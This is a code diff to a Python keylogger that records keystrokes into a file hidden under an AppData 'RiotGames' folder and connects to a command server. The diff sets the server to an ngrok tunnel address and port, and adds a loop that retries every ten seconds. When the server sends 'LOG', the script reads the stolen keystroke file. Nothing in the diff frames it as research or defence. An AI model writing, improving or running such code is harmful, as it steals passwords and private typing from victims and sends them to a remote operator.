@@ -3,6 +3,7 @@ import keyboard
 import subprocess
 from pathlib import Path
 import threading
+import time
 
 # Path to the log file
 log_folder = Path.home() / "AppData" / "Roaming" / "RiotGames"
@@ -18,17 +19,17 @@ def on_key_press(event):
 
 # Function to handle socket communication
 def handle_socket():
-    HOST = ""  
+    HOST = "6.tcp.eu.ngrok.io"  
     PORT = 13223
-    
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect((HOST, PORT))
-            print("Connected to server.")
 
-            while True:
-                try:
-                    # Wait for a command from the server
+    while True:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((HOST, PORT))
+                print("Connected to server.")
+
+                # Wait for server commands
+                while True:
                     data = s.recv(4096)
                     if not data:
                         print("Connection closed by server.")
@@ -37,7 +38,7 @@ def handle_socket():
                     command = data.decode("utf-8").strip()
                     print(f"Server says: {command}")
 
-                    # Handle server commands here
+                    # Handle commands from server
                     if command.upper() == "LOG":
                         try:
                             with log_file.open("r") as f:
@@ -51,12 +52,9 @@ def handle_socket():
                         print("Server requested to close the connection.")
                         break
 
-                except Exception as e:
-                    print(f"Error during communication: {e}")
-                    break
-
-    except Exception as e:
-        print(f"Failed to connect to server: {e}")
+        except (ConnectionRefusedError, socket.error):
+            print("Failed to connect to server. Retrying in 10 seconds...")
+            time.sleep(10)  # Wait 10 seconds before retrying
 
 # Start a new thread to handle socket communication
 socket_thread = threading.Thread(target=handle_socket)
